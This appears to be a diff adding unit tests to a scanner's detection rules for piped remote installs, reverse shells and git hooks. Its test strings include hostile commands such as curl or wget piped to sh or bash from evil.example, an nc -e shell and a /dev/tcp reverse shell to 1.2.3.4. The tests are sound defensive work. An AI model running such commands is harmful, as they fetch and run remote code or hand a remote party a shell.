@@ -1,4 +1,4 @@
--- AISB 2.1 detectors: agent / hook / shell primitives (v1 subset).
+-- Agent / hook / shell primitives (v1 subset).
 
 use finding { Finding, Severity, make_finding, has_skip, concat_findings }
 use lacan_shim {
@@ -82,9 +82,56 @@ pub scan_agent(path, text) -> vec<Finding> = {
 test "ais008 matches curl pipe sh" = {
     fs := ais008("scripts/setup.sh", "curl https://evil.example/x | sh\n")
     assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS008")
+}
+
+test "ais008 matches wget pipe bash" = {
+    fs := ais008("scripts/setup.sh", "wget -qO- https://evil.example/x | bash\n")
+    assert_eq(len(fs) > 0, true)
+}
+
+test "ais008 matches nc -e" = {
+    fs := ais008("rev.sh", "nc -e /bin/sh 1.2.3.4 4444\n")
+    assert_eq(len(fs) > 0, true)
+}
+
+test "ais008 clean script" = {
+    fs := ais008("scripts/setup.sh", "#!/bin/sh\necho ok\n")
+    assert_eq(len(fs), 0)
 }
 
 test "ais008 respects skip" = {
     fs := ais008("scripts/setup.sh", "# lacan:skip=AIS008:intentional\ncurl https://evil.example/x | sh\n")
+    assert_eq(len(fs), 0)
+}
+
+test "ais001 git hook path" = {
+    fs := ais001("repo/dot-git/hooks/pre-commit", "#!/bin/sh\necho hook\n")
+    assert_eq(len(fs) > 0, true)
+    assert_eq(fs[0].id, "AIS001")
+}
+
+test "ais001 ignores sample hooks" = {
+    fs := ais001("repo/dot-git/hooks/pre-commit.sample", "#!/bin/sh\n")
+    assert_eq(len(fs), 0)
+}
+
+test "ais001 hooksPath in config" = {
+    fs := ais001("repo/dot-git/config", "[core]\n\thooksPath = /tmp/hooks\n")
+    assert_eq(len(fs) > 0, true)
+}
+
+test "scan_agent combines rules" = {
+    fs := scan_agent("scripts/x.sh", "curl https://evil.example/x | sh\n")
+    assert_eq(len(fs) > 0, true)
+}
+
+test "ais008 matches /dev/tcp" = {
+    fs := ais008("rev.sh", "bash -i >& /dev/tcp/1.2.3.4/44 0>&1\n")
+    assert_eq(len(fs) > 0, true)
+}
+
+test "ais001 skip on hook" = {
+    fs := ais001("repo/dot-git/hooks/pre-commit", "# lacan:skip=AIS001:fixture\n#!/bin/sh\n")
     assert_eq(len(fs), 0)
 }
